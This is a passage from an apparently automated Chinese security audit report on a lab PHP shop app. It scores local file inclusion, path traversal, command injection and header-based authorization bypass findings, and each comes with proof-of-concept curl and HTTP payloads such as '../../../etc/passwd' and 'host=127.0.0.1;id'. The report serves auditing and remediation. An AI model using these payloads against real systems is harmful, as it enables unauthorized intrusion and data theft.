| A | N | 未见可用性破坏证据 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'lfi_page_poc.txt', 'language': 'text', 'script': 'GET /content/page.php?page=../../../../var/lib/shop/vault/account HTTP/1.1\nHost: target', 'instructions': '先运行 bin/reset.php 生成 $SHOP_DATA_DIR/vault/account.php；未登录请求目标 /content/page.php?page=../../../../var/lib/shop/vault/account，按部署层级调整 ../ 数量。', 'normal_input': '?page=home', 'attack_input': '?page=../../../../var/lib/shop/vault/account', 'expected_result': '正常输入渲染首页；攻击输入包含并执行 vault/account.php，输出 SHOP_INTERNAL_ 标记。'}
````

- content/page.php 未过滤 page 参数拼接进 include 导致本地文件包含/路径遍历（CVSS 3.1 Base 9.4 (critical) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L，验证：inconclusive）
  来源 `02382998c0e9443db6bc30127a306e75` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/content/page.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 3, 'end_line': 3}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 25, 'end_line': 26}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 34, 'end_line': 35}, {'path': 'lab30-shop/app/resources/views/home.php', 'start_line': 1, 'end_line': 1}]
  结论：content/page.php 从 GET 取 page 参数（第2行 (string)($_GET['page']??'home')），未经白名单或字符过滤直接拼接 APP_ROOT.'/resources/views/'.$name.'.php' 并 include（第3行）。攻击者可用 ../ 穿越到任意目录下后缀为 .php 的文件被 PHP 解析执行，也可指向 data_dir 下由 setup.php 写入的 /var/lib/shop/vault/account.php（含内部标记）等文件，造成任意文件包含/代码执行与信息泄露。该入口无 require_user 鉴权，匿名可达。
  输入：HTTP GET 参数 page
  传播：$_GET['page'] -> $name -> include APP_ROOT.'/resources/views/'.$name.'.php'
  危险操作：include 动态路径（本地文件包含/PHP 解析执行）
  保护：无白名单、无 basename、无 ../ 过滤；仅追加 .php 后缀；入口未调用 require_user
  前提：['攻击者能发送 GET 请求到 /content/page.php，PHP 进程对目标文件可读']
  修复建议：使用固定白名单映射（home/shipping）或在拼接前用 basename() 并校验 realpath 位于 views 目录内，禁用 ../；必要时移除动态 include。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:37:47.221627+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 公开 HTTP 入口，无需邻接网络 | lab30-shop/app/public/content/page.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造 ../ 路径即可稳定触发 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 入口未做身份校验 | lab30-shop/app/public/content/page.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需其他用户交互 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在应用自身权限内执行包含文件 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可包含并执行攻击者指向的 PHP 文件且可读内部文件 | lab30-shop/app/src/setup.php:34-35 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 被包含脚本以应用上下文执行 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | L | 可执行任意被包含代码影响可用性 | lab30-shop/app/public/content/page.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'lfi_page_poc.sh', 'language': 'bash', 'script': "curl -s -o /dev/null -w '%{http_code}\\n' 'http://TARGET/content/page.php?page=home'\ncurl -s 'http://TARGET/content/page.php?page=../../../var/lib/shop/vault/account' | grep -o 'SHOP_INTERNAL_[a-f0-9]*'", 'instructions': '先确保已执行 bin/reset.php 生成 data_dir 文件；将 TARGET 替换为目标主机，首个请求为正常输入，第二个为穿越输入。', 'normal_input': 'page=home', 'attack_input': 'page=../../../var/lib/shop/vault/account', 'expected_result': '正常请求返回内容中心页面；攻击请求响应体中出现 SHOP_INTERNAL_ 内部标记（文件被包含并执行）'}
````


### 台账 `4258d2730d2d43e18af2e8ef4dc15d1c`

- host_check.php 将 host 拼接进 shell_exec 导致操作系统命令注入（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：inconclusive）
  来源 `4201fd11d060490da1e1e907d85d7632` / 修订 1
  证据：[{'path': 'lab30-shop/app/src/host_check.php', 'start_line': 1, 'end_line': 2}, {'path': 'lab30-shop/app/public/ops/batch-check.php', 'start_line': 1, 'end_line': 3}]
  结论：src/host_check.php 第2行把 $host 直接拼进 'ping -c 1 -W 1 '.$host 交给 shell_exec；public/ops/batch-check.php 第2行从 $_GET['host'] 取值传入。仅有 require_user(['operator','admin']) 身份校验，对 host 无任何转义，operator/admin 可用 ; | $() 注入任意命令并将结果回显到页面 pre。
  输入：HTTP GET 参数 host（/ops/batch-check.php）
  传播：batch-check.php:2 $_GET['host'] -> host_check($host) -> shell_exec('ping -c 1 -W 1 '.$host)
  危险操作：shell_exec 执行拼接了用户输入的系统命令
  保护：仅 require_user 角色校验，无 escapeshellarg 或格式校验
  前提：['持有 operator 或 admin 会话；shell_exec 与 ping 可用']
  修复建议：使用 escapeshellarg 并严格校验 IP/主机名，或改以数组参数 proc_open。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:29:57.278060+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | Web 接口远程触发 | lab30-shop/app/public/ops/batch-check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 拼接元字符即可 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator/admin 登录 | lab30-shop/app/public/ops/batch-check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人交互 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一主机执行 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 命令输出回显 | lab30-shop/app/public/ops/batch-check.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 任意命令可修改系统 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 任意命令可破坏服务 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `e5d8eaa6aeda4c9fbcb0a1d999a58609`

- maintenance.php 以客户端可控的 X-Admin 请求头作为唯一授权，可越权创建维护任务（CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N，验证：inconclusive）
  来源 `9c24df0090d94dda80a97cccea4d6534` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/maintenance.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 29, 'end_line': 40}]
  结论：maintenance.php 第3行用 $_SERVER['HTTP_X_ADMIN']!=='1' 作为内部维护接口的访问控制，请求头由客户端完全控制，未结合 user()/require_user 或会话身份。POST 请求通过第3行后，第4行执行 INSERT INTO jobs 并返回 job_id，从而未授权即可创建维护任务数据。bootstrap.php 提供了 require_user 与 check_csrf，但本文件未调用，也无 CSRF token 校验。
  输入：攻击者构造 HTTP 请求头 X-Admin: 1，并使用 POST 方法访问 /ops/maintenance.php
  传播：第3行读取 HTTP_X_ADMIN 并与 '1' 比较，通过后进入第4行 POST 分支
  危险操作：第4行 db()->prepare("INSERT INTO jobs(user_id,title,status,details) VALUES(4,?,'queued','维护接口发起')")->execute(['系统对账']) 插入任务记录
  保护：仅检查请求头是否等于 '1'；未调用 require_user、未验证会话身份、未调用 check_csrf
  前提：['目标服务可访问，且通过 POST 请求访问 maintenance.php；请求头可被客户端任意设置']
  修复建议：删除基于请求头的信任判断，改用 require_user(['operator','admin']) 或服务间强认证（签名、mTLS、不可伪造的内部令牌）；对状态变更接口补充 CSRF 校验并记录审计事件。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:37:04.124240+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 维护接口通过 Web 请求直接访问 | lab30-shop/app/public/ops/maintenance.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需在请求头中设置固定值 1 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 第3行仅检查请求头，未调用 require_user 或会话校验 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者可直接发起请求，无需其他用户参与 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在同一应用内绕过接口授权，无授权边界切换证据 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 源码只表现为写入任务记录，无读取敏感数据证据 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可向 jobs 表插入 queued 维护任务，改变应用任务数据 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 未见删除或中断服务操作 | lab30-shop/app/public/ops/maintenance.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'ops_maintenance_auth_bypass.sh', 'language': 'bash', 'script': "#!/bin/sh\n# 目标入口: https://TARGET/ops/maintenance.php\ncurl -i -X POST \\\n  -H 'X-Admin: 1' \\\n  -H 'Accept: application/json' \\\n  'https://TARGET/ops/maintenance.php'\n", 'instructions': '将 TARGET 替换为部署主机后执行；对照请求不发送 X-Admin 头或设为 0，应返回 403；发送 X-Admin: 1 的 POST 应返回 accepted=true 与 job_id。', 'normal_input': 'POST /ops/maintenance.php 不带 X-Admin 头，或 X-Admin: 0', 'attack_input': 'POST /ops/maintenance.php 携带 X-Admin: 1', 'expected_result': '对照组返回 403 未授权；攻击组返回 HTTP 200 JSON {"accepted":true,"job_id":...}，表明未登录即创建了维护任务。'}
````

- ops/maintenance.php 仅凭可伪造的 X-Admin 请求头即触发维护写操作（认证绕过/越权）（CVSS 3.1 待评分，验证：verified）
  来源 `a29e5bacfec741789c3a44f841f83595` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/maintenance.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/docker/apache.conf', 'start_line': 1, 'end_line': 12}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 12, 'end_line': 12}]
  结论：maintenance.php 以 $_SERVER['HTTP_X_ADMIN'] 是否等于 '1' 作为唯一的身份判定，未使用 require_user、会话或任何服务端凭证校验，也没有调用 check_csrf。任何未认证请求只要附加 X-Admin: 1 头即通过第 3 行检查，随后第 4 行对 POST 请求执行 INSERT INTO jobs，写入 title='系统对账'、status='queued'、details='维护接口发起'，并返回 accepted 与 job_id。docker/apache.conf 直接把 app/public 作为 DocumentRoot 且 Require all granted，未对该路径或该头做任何网关过滤，因此该“内部维护接口”可从外部直接调用，造成越权数据写入。
  输入：HTTP 请求头 X-Admin（$_SERVER['HTTP_X_ADMIN']）以及 POST 请求方法
  传播：HTTP_X_ADMIN 直接参与第 3 行字符串比较；比较通过后 $_SERVER['REQUEST_METHOD']==='POST' 进入第 4 行 db()->prepare(...)->execute() 写入 jobs 表
  危险操作：db()->prepare("INSERT INTO jobs(...) VALUES(4,?,'queued','维护接口发起')")->execute(['系统对账']) 数据库写操作
  保护：无有效防护：仅基于客户端可控请求头做等值判断，未使用会话/角色校验（bootstrap.php 提供 require_user 但此文件未使用），也无 CSRF 校验
  前提：['web 服务对外可达（compose 端口映射 127.0.0.1:18880，apache 无额外限制）；无需登录']
  修复建议：移除此类基于请求头的信任判断，改为校验服务间真实凭证（如 mTLS、签名令牌）或使用 require_user(['admin']) 会话鉴权；对写操作增加 CSRF/权限检查，并将维护接口限制在内网或网关白名单。

**CVSS 3.1 评分依据**

- 状态：待补充指标；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:41:45.990658+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | Apache 直接以 public 为 DocumentRoot 且 Require all granted，接口对公网可达 | lab30-shop/docker/apache.conf:4-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 攻击者只需在请求中附加固定头 X-Admin: 1，无需其他条件 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 文件未调用 require_user/session，任何未认证请求均可 | lab30-shop/app/public/ops/maintenance.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | 待补充 | 无需其他用户交互 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| S | 待补充 | 仍在同一 Web 应用内写入 jobs 表 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| C | N | 无读取数据影响 | lab30-shop/app/public/ops/maintenance.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可无限追加 jobs 记录，污染任务队列/运营数据 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/setup.php:12-12 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | 待补充 | 未见服务中断证据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'maintenance_auth_bypass.sh', 'language': 'bash', 'script': "curl -s -i -X POST -H 'X-Admin: 1' http://127.0.0.1:18880/ops/maintenance.php", 'instructions': '对运行中的 lab30-shop web 容器发请求，URL 指向 /ops/maintenance.php；正常对照运行去掉 -X POST 与 X-Admin 头的版本。', 'normal_input': 'curl -s -i http://127.0.0.1:18880/ops/maintenance.php', 'attack_input': 'POST /ops/maintenance.php 配合请求头 X-Admin: 1', 'expected_result': '对照请求返回 403 错误页；攻击请求返回 JSON {"accepted":true,"job_id":N}，jobs 表新增一行 status=\'queued\' 记录'}
````


### 台账 `cae54c4a7efd4c969fbcd44e4170cb9f`

- ops/batch-check.php 将 host 参数拼接进 shell_exec 导致操作系统命令注入（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：verified）
  来源 `30e2519b1a9d49b894a661003fd261d5` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/batch-check.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/host_check.php', 'start_line': 1, 'end_line': 2}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 34, 'end_line': 36}]
  结论：batch-check.php 读取 GET host 后调用 host_check($host)（第2行），host_check 直接以 'ping -c 1 -W 1 ' . $host 传入 shell_exec（host_check.php 第2行），无 escapeshellarg/白名单。含 ; 或 $() 的 host 可执行任意系统命令；页面再用 h() 输出，但命令执行已发生。
  输入：HTTP GET 参数 host
  传播：$_GET['host'] -> $host -> host_check($host) -> shell_exec('ping ... ' . $host)
  危险操作：shell_exec 拼接未转义的外部输入
  保护：$output 仅用 h() HTML 转义，不能阻止 shell 元字符；无白名单、无 escapeshellarg
  前提：["需要 operator 或 admin 会话（require_user(['operator','admin'])）；默认种子含 operator 账号"]
  修复建议：使用 escapeshellarg($host) 并对主机做严格校验（如 filter_var FILTER_VALIDATE_IP/域名白名单），或改用非 shell 的进程调用参数数组。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:37:47.223162+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 入口 | lab30-shop/app/public/ops/batch-check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 拼接 ;id 即可执行 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator/admin 账户 | lab30-shop/app/src/bootstrap.php:34-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身发起请求 | lab30-shop/app/public/ops/batch-check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在同一进程权限内执行命令 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取任意系统文件/输出 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可执行任意命令 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 任意命令可破坏服务 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'cmdi_host_check.sh', 'language': 'bash', 'script': "curl -s -b 'SHOPSESSID=SESSION' 'http://TARGET/ops/batch-check.php?host=127.0.0.1'\ncurl -s -b 'SHOPSESSID=SESSION' 'http://TARGET/ops/batch-check.php?host=127.0.0.1;id'", 'instructions': '以 operator 账户登录取得会话 Cookie，替换 TARGET 与 SESSION；对照正常与注入输入。', 'normal_input': 'host=127.0.0.1', 'attack_input': 'host=127.0.0.1;id', 'expected_result': '正常请求输出 ping 结果；注入请求响应 <pre> 中出现 uid= 命令执行输出'}
````


### 台账 `72cb4ac981524dc3bbfd1e1f1e203564`

- support/download.php 文件参数未校验导致任意文件读取路径穿越（CVSS 3.1 待评分，验证：inconclusive）
  来源 `62259662bf4e485a860236f1223492a1` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/support/download.php', 'start_line': 3, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 9, 'end_line': 9}]
  结论：download.php 第3行将 $_GET['file'] 直接拼接到 data_dir().'/docs/' 后交给 is_file/file_get_contents，未做 basename 或 realpath 前缀校验。攻击者用 ../ 序列可穿越出 docs 目录读取 data_dir 下乃至（结合足够 ../）其他可读文件，例如 sessions 文件、配置等，并以 text/plain 返回内容。
  输入：GET file 参数（已登录用户）
  传播：GET file -> data_dir().'/docs/'.file -> is_file -> file_get_contents 输出
  危险操作：file_get_contents(data_dir().'/docs/'.$_GET['file'])
  保护：仅要求登录，无 basename/realpath/前缀校验
  前提：['需已登录账号（require_user）；data_dir 及目标文件可读']
  修复建议：使用 basename() 限制文件名，或 realpath 后校验前缀 data_dir.'/docs/'，拒绝 .. 与绝对路径。

**CVSS 3.1 评分依据**

- 状态：待补充指标；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:39:13.914577+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP GET 可触发 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接构造 ../ 即可 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录 | lab30-shop/app/public/support/download.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | 待补充 | 无需他人参与 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| S | 待补充 | 同一应用内读取 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| C | H | 可读取会话/配置等敏感文件 | lab30-shop/app/src/bootstrap.php:9-18 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | 待补充 | 只读 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| A | 待补充 | 只读 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'download_traversal.txt', 'language': 'text', 'script': 'GET /support/download.php?file=../../../etc/passwd\nCookie: SHOPSESSID=<valid>\n或 GET /support/download.php?file=../../src/bootstrap.php 读取源码', 'instructions': '登录后带 Cookie 请求上述 URL 观察返回内容。', 'normal_input': 'file=shipping.txt', 'attack_input': 'file=../../../etc/passwd', 'expected_result': '正常输入返回 shipping.txt 内容；攻击输入返回 docs 目录之外文件内容'}
````


### 台账 `63b82922f003437a85edbdf1c0f4815d`

- 运营诊断接口 ops/ping.php 将 GET host 直接拼接进 shell_exec 造成命令注入（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：inconclusive）
  来源 `b4fa3ecf3da5481785eb52cd7fa0c7c5` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/ping.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}, {'path': 'lab30-shop/app/src/host_check.php', 'start_line': 1, 'end_line': 2}, {'path': 'lab30-shop/app/public/ops/batch-check.php', 'start_line': 1, 'end_line': 3}]
  结论：ops/ping.php 第2行从 $_GET['host'] 取值，仅判断非空后直接拼接进 shell_exec('ping -c 1 -W 1 '.$host)。require_user 只限制 operator/admin 登录，未对 host 做任何转义或白名单校验，攻击者可用 '127.0.0.1;id' 之类载荷执行任意命令。同源漏洞出现在 host_check.php 第2行及 batch-check.php 第2行调用点。
  输入：HTTP GET 参数 host
  传播：$_GET['host'] -> (string) -> 字符串拼接 -> shell_exec
  危险操作：shell_exec('ping -c 1 -W 1 ' . $host)
  保护：仅有 require_user(['operator','admin']) 角色校验，无转义/过滤/白名单
  前提：['攻击者持有 operator 或 admin 角色会话']
  修复建议：对 host 使用 escapeshellarg 并强制 IP/域名白名单，或改用过滤后的参数数组调用进程而不经过 shell。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:39:58.558494+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP GET 参数 host 可直接远程提交 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 无需特殊条件，直接附加 ; 或 $() 即可 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator/admin 账号，require_user 校验角色 | lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者本人发起请求 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在同一 PHP 进程上下文中执行命令 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可执行任意系统命令读取任意文件/数据 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 命令执行可修改系统与应用数据 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 可执行破坏性命令影响服务可用性 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'ping_rce.sh', 'language': 'bash', 'script': '#!/usr/bin/env bash\n# 登录后获取会话 cookie 再执行\nBASE="http://TARGET"\nCOOKIE="SHOPSESSID=<operator_session_id>"\n# 正常请求\ncurl -s -b "$COOKIE" "$BASE/ops/ping.php?host=127.0.0.1"\necho \'--- attack ---\'\n# 注入命令\ncurl -s -b "$COOKIE" --get --data-urlencode "host=127.0.0.1;id" "$BASE/ops/ping.php"\n', 'instructions': '以 operator/admin 账号登录后，将 BASE 与会话 Cookie 替换，访问 /ops/ping.php。对照组返回 ping 输出，攻击组返回 id 命令结果。', 'normal_input': 'host=127.0.0.1', 'attack_input': 'host=127.0.0.1;id', 'expected_result': '正常请求返回 ping 统计，攻击请求的 <pre> 中出现 uid= 命令输出'}
````


### 台账 `c55ff9bdfd75424da81a08b28f5623ba`

- 维护接口仅凭可伪造 X-Admin 请求头放行且 POST 无 CSRF 直接写入 jobs（CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N，验证：verified）
  来源 `0889ad034f5a4302938e78459e5c1ad2` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/maintenance.php', 'start_line': 3, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 40, 'end_line': 40}]
  结论：maintenance.php 第 3 行仅检查攻击者完全可控的 HTTP_X_ADMIN 头是否等于 '1'，不使用 user()/require_user() 会话校验；第 4 行在 POST 时未调用 check_csrf() 即执行 INSERT 写入 jobs 表。攻击者发送 X-Admin: 1 的 POST 即可在未认证情况下触发写操作。
  输入：HTTP 请求头 X-Admin 与请求方法 POST
  传播：第 3 行读取 $_SERVER['HTTP_X_ADMIN'] 比较后放行；第 4 行直接执行 db()->prepare(...)->execute()
  危险操作：INSERT INTO jobs 写入数据库
  保护：仅字符串相等判断；该头由客户端任意设置，无签名或会话绑定。check_csrf 存在但未调用。
  前提：['攻击者能向 /ops/maintenance.php 发送 HTTP 请求并设置 X-Admin: 1；数据库可用。']
  修复建议：改用 require_user(['operator','admin']) 或服务端密钥签名校验；POST 前调用 check_csrf() 或使用双提交令牌。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:42:51.537970+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口公网可达 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需在请求中加 X-Admin: 1 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 未认证即可伪造请求头 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需其他用户参与 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在应用自身授权边界内 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
